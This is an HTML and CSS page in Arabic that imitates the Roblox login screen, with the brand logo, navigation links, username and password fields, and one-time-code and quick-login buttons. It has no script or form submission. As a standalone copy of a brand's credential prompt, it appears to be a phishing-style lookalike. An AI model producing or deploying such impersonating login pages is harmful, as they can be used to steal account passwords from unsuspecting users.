<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}

/* الشريط */
.navbar{
  background:linear-gradient(#1a1a1a,#0f0f0f);
  height:64px;
  display:flex;
  align-items:center;
  padding:0 18px;
}
.logo{
  font-size:24px;
  font-weight:900;
  margin-right:20px;
}
.links{
  display:flex;
  gap:18px;
}
.links a{
  color:#ddd;
  text-decoration:none;
  font-size:14px;
}
.links a:hover{color:white}
.actions{
  margin-left:auto;
  display:flex;
  gap:10px;
}
.btn-blue{
  background:#2a7cff;
  border:none;
  color:white;
  padding:8px 14px;
  border-radius:8px;
}
.btn-dark{
  background:#111;
  border:1px solid #555;
  color:white;
  padding:8px 14px;
  border-radius:8px;
}

/* الصفحة */
.main{
  display:flex;
  justify-content:center;
  margin-top:60px;
}
.box{
  background:#23262f;
  width:380px;
  padding:25px;
  border-radius:12px;
  text-align:center;
}
.hero-img{
  width:100%;
  border-radius:10px;
  margin-bottom:15px;
}
.box h2{margin:10px 0;}
.box input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  background:#2f3340;
  color:white;
}
.mainbtn{
  width:100%;
  padding:12px;
  background:#2a7cff;
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
}
.sec{
  width:100%;
  padding:12px;
  background:#2f3340;
  border:none;
  border-radius:8px;
  color:white;
  margin-top:10px;
}
.small{font-size:13px;color:#ccc;margin:12px 0;}
.line{height:1px;background:#444;margin:15px 0;}
</style>
</head>

<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>
  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>
  <div class="actions">
    <button class="btn-blue">تسجيل الدخول</button>
    <button class="btn-dark">تسجيل</button>
  </div>
</div>

<div class="main">
<div class="box">

  <!-- الصورة -->
  <img src="IMG_0161.png" class="hero-img">

  <h2>تسجيل الدخول إلى Roblox</h2>

  <input type="text" placeholder="اسم المستخدم">
  <input type="password" placeholder="كلمة المرور">

  <button class="mainbtn">تسجيل الدخول</button>

  <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
  <div class="line"></div>

  <button class="sec">إرسال رمز لمرة واحدة عبر البريد</button>
  <button class="sec">تسجيل دخول سريع</button>

  <div class="small">ليس لديك حساب؟ اشترك</div>

</div>
</div>

</body>
</html>
